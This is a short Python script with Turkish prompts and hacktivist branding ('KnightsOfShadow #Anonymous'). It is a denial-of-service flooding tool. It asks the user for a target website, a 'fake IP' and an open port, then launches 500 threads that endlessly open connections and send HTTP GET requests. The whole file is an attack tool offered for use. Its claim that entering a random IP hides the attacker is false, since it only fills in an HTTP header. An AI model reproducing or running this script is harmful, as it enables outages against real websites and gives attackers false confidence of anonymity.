import socket
import threading 
from pip._vendor.colorama import Fore

#Örnek veri poliçesi.
#target = '195.20.52.179'
#fake_ip = '182.21.20.32'
#port = 80

baner = ('''
  _   _  _                  _       _   
 | | | || |                | |     | |  
 | | | || |_ _ __   ___ ___| | ___ | |_ 
 | | |__   _| '_ \ / __/ _ \ |/ _ \| __|
 | |____| | | | | | (_|  __/ | (_) | |_ 
 |______|_| |_| |_|\___\___|_|\___/ \__|
 ''')                                       
                                        
print(Fore.LIGHTBLUE_EX+baner)

print(Fore.BLUE+'İnstagram = @KnightL4ncelot')
print(Fore.CYAN+'KnightsOfShadow #Anonymous')

print(Fore.BLUE+"DDos Website (K.O..) ")
print(Fore.BLUE+"website url")
target = input("\t -----------) ")
print("Kendinizi gizlemek icin rastgele bi ip girin....")
fake_ip = input("\t\t -----------) ")
print("K.O.S Port Tarama uzerinden baktığınzı açık portu girin")
port = input("\t\t -----------) ")

port = int(port)

attack_num = 0

print("K.O.S Sending Packets...")

def attack():

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        packesnum =attack_num
        packesnum= str(packesnum)
        print("Paketler Gönderiliyor.... => "+packesnum)
        print("Gonderildi....")
        
        
print("Paketler Basari ile gonderildi!")

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()



